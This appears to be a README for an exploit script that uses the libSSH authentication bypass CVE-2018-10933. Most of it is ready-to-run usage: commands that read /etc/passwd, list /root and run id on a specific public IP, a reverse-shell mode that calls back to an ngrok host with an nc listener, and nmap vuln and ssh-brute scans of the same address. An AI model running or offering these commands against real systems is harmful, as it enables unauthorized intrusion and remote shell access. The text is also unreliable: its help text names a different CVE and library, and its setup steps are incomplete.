# LibSSH - Authentication Bypass 
***
## Documentation
Exploit-DB : https://www.exploit-db.com/exploits/45638

Information about CVE-2018-10933 by libSSH : https://www.libssh.org/security/advisories/CVE-2018-10933.txt

Bugfix Release by libSSH : https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/

## Setup

```
python3 -m venv venv
git clone
source venv/bin/activate
pip install
cd 
chmod +x CVE-2018-10933.py
python3 CVE-2018-10933.py
```
### EXAMPLE( send command via argument)
```
python3 CVE-2018-10933.py 35.240.142.53 22 "cat /etc/passwd"
python3 CVE-2018-10933.py 35.240.142.53 22 "id" 
python3 CVE-2018-10933.py 35.240.142.53 22 "whoami"
python3 CVE-2018-10933.py 35.240.142.53 22 "ls -la /root" 
python3 CVE-2018-10933.py 35.240.142.53 22 "ls -la /tmp"
```

## Usage 
```
[*] Usage 1 (Direct Command): python3 CVE-2018-10933.py <IP> <PORT> "<COMMAND>"
[*] Usage 2 (Reverse Shell): python3 CVE-2018-10933.py <IP> <PORT> <NGROK_HOST> <NGROK_PORT>
[*] Example (Shell): python3 CVE-2018-10933.py 35.240.142.53 22 0.tcp.ap.ngrok.io 17415
[*] Example (Netcat): nc -lvnp 4444

Script for SSH Authentication Bypass (CVE-2018-15473/Paramiko)

positional arguments:
  TARGET_IP               The IP address or hostname of the SSH server.
  PORT                    The port the SSH service is running on (e.g., 22).
  
execution modes (choose one):
  COMMAND                 Execute a direct command on the remote server (Requires 3 total arguments).
  NGROK_HOST NGROK_PORT   Activate Reverse Shell mode to the specified listener (Requires 5 total arguments).
  
options:
  -h, --help              Show this help message and exit.
```

```
nmap -p 22 --script ssh-hostkey,ssh-auth-methods,ssh-brute,vuln <IP>
nmap -p 22 --script vuln 35.240.142.53
nmap -sS -sV 35.240.142.53
nmap -p 22 35.240.142.53
```
